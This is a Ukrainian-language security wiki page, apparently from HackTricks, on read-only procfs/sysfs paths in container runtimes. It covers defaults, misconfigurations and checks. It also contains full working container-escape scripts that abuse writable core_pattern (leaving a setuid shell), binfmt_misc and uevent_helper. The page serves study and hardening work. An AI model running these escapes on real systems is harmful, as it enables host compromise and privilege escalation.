# Системні шляхи лише для читання

{{#include ../../../../banners/hacktricks-training.md}}

Системні шляхи лише для читання — окрема міра захисту від masked paths. Замість повного приховування шляху, runtime робить його видимим, але монтує як лише для читання. Це поширено для окремих розділів procfs та sysfs, де доступ для читання може бути прийнятним або необхідним для роботи, але запис був би надто небезпечним.

Мета проста: багато kernel interfaces стають значно небезпечнішими, коли вони доступні для запису. Монтування лише для читання не позбавляє всієї цінності для розвідки, але перешкоджає скомпрометованому робочому навантаженню змінювати нижележачі файли, що взаємодіють із ядром, через цей шлях.

## Принцип роботи

Середовища виконання часто позначають частини перегляду proc/sys як лише для читання. Залежно від runtime та хоста, це може включати такі шляхи:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Фактичний перелік варіюється, але модель та сама: дозволяти видимість там, де потрібно, за замовчуванням забороняти зміну.

## Лаб

Огляньте перелік шляхів, оголошених Docker як лише для читання:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Перегляньте змонтований вигляд proc/sys зсередини контейнера:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Шляхи системи з правом тільки для читання звужують велику категорію зловживань, що впливають на хост. Навіть якщо атакуючий може переглядати procfs або sysfs, неможливість запису туди усуває багато прямих шляхів модифікації, пов’язаних з параметрами ядра, обробниками аварій, допоміжними механізмами завантаження модулів або іншими інтерфейсами керування. Уразливість не зникає повністю, але перехід від розкриття інформації до впливу на хост стає складнішим.

## Misconfigurations

Основні помилки — це unmasking або перемонтування чутливих шляхів у режимі для читання й запису, безпосереднє відкриття вмісту хоста proc/sys через записувані bind mounts або використання привілейованих режимів, які фактично обходять більш безпечні значення runtime за замовчуванням. У Kubernetes, `procMount: Unmasked` і привілейовані робочі навантаження часто йдуть разом зі слабшим захистом proc. Ще одна поширена операційна помилка — припущення, що оскільки runtime зазвичай монтує ці шляхи як тільки для читання, всі робочі навантаження все ще успадковують цей дефолт.

## Abuse

Якщо захист слабкий, почніть із пошуку записів у proc/sys, доступних для запису:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Якщо присутні writable entries, цінні шляхи для подальших дій включають:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Записи з можливістю запису під `/proc/sys` часто означають, що контейнер може змінювати поведінку ядра хоста, а не лише її переглядати.
- `core_pattern` особливо важливий, тому що значення, доступне для запису з боку хоста, можна перетворити на host code-execution path, наприклад шляхом crash процесу після встановлення pipe handler.
- `modprobe` показує helper, який ядро використовує для потоків, пов'язаних із завантаженням модулів; коли він доступний для запису, це класична ціль високої цінності.
- `binfmt_misc` показує, чи можливе реєстрування кастомного інтерпретатора. Якщо реєстрація доступна для запису, це може стати примітивом виконання замість простого інформаційного leak.
- `panic_on_oom` керує рішенням ядра на рівні хоста і тому може перетворити вичерпання ресурсів у відмову в обслуговуванні хоста.
- `uevent_helper` — один із найочевидніших прикладів того, як записуваний sysfs helper-шлях може призводити до виконання в контексті хоста.

Цікавими знахідками є записувані host-facing proc-регульовані елементи або записи sysfs, які зазвичай мали б бути тільки для читання. У цей момент робоче навантаження переходить від обмеженого контейнерного огляду до реального впливу на ядро.

### Full Example: `core_pattern` Host Escape

Якщо `/proc/sys/kernel/core_pattern` доступний для запису зсередини контейнера і вказує на подання ядра хоста, його можна зловживати для виконання payload після crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Якщо шлях справді дістається ядра хоста, payload виконується на хості і залишає setuid shell.

### Повний приклад: реєстрація `binfmt_misc`

Якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису, реєстрація власного інтерпретатора може призвести до виконання коду при запуску відповідного файлу:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Якщо `binfmt_misc` доступний для запису з хоста, то результатом є виконання коду в інтерпретаторі, викликаному ядром.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, ядро може викликати допоміжну програму з шляху на хості, коли відбувається відповідна подія:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Причина, чому це так небезпечно, полягає в тому, що шлях до допоміжного файлу вирішується з точки зору файлової системи хоста, а не з безпечного контексту, обмеженого контейнером.

## Перевірки

Ці перевірки встановлюють, чи експозиція procfs/sysfs є тільки для читання там, де це очікується, і чи може робоче навантаження все ще змінювати чутливі інтерфейси ядра.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Що цікаво тут:

- Звичайне захищене робоче навантаження має надавати дуже мало записуваних шляхів у /proc/sys.
- Записувані `/proc/sys` шляхи часто важливіші, ніж звичайний доступ на читання.
- Якщо runtime вказує, що шлях лише для читання, але на практиці він записуваний, уважно перевірте mount propagation, bind mounts та налаштування привілеїв.

## Налаштування runtime за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Docker визначає типовий список шляхів лише для читання для чутливих записів у /proc | експонування монтувань host /proc/sys, `--privileged` |
| Podman | Увімкнено за замовчуванням | Podman застосовує типовий список шляхів лише для читання, якщо вони явно не послаблені | `--security-opt unmask=ALL`, широкі монтування хоста, `--privileged` |
| Kubernetes | Наслідує налаштування runtime за замовчуванням | Використовує модель шляхів лише для читання підлеглого runtime, якщо її не послаблено налаштуваннями Pod або монтуваннями хоста | `procMount: Unmasked`, привілейовані робочі навантаження, записувані монтування host /proc/sys |
| containerd / CRI-O under Kubernetes | Значення runtime за замовчуванням | Зазвичай покладається на OCI/runtime за замовчуванням | те саме, що в рядку Kubernetes; прямі зміни конфігурації runtime можуть послабити поведінку |

Ключова думка: шляхи системи лише для читання зазвичай присутні як значення runtime за замовчуванням, але їх легко підривати привілейованими режимами або host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
